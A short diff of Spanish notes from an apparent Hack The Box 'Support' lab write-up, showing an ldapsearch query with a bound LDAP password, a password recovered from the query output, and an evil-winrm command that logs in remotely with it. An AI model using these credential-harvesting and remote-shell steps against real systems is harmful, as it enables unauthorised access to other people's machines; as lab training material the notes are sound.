@@ -126,7 +126,8 @@ con esta inyección podemos ver que hay conexión
 ldapsearch -H ldap://support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "Administrator"
 ```
 ![[Pasted image 20240305002408.png]]
-analizamos la peticion es un trabajo arduo pero podemos encrontrar un u Ironside47pleasure40Watchful'
+analizamos la peticion es un trabajo arduo pero podemos encrontrar lo que parece una contraseña "Ironside47pleasure40Watchful"
 
-### Evil-winrm
+### evil-winrm
+```python
 evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
